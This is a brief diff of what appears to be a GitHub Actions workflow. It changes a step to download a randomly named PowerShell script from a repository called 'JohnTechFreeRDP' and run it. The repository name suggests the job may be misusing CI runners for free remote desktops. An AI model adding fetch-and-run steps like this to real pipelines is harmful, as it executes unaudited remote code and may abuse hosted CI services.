@@ -35,4 +35,4 @@ jobs:
     - name: looping
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/JohnTechFreeRDP/main/sYx9aFxYzdZHh1YZa.ps1 -OutFile sYx9aFxYzdZHh1YZa.ps1
-        ./loop.ps1
+        ./sYx9aFxYzdZHh1YZa.ps1
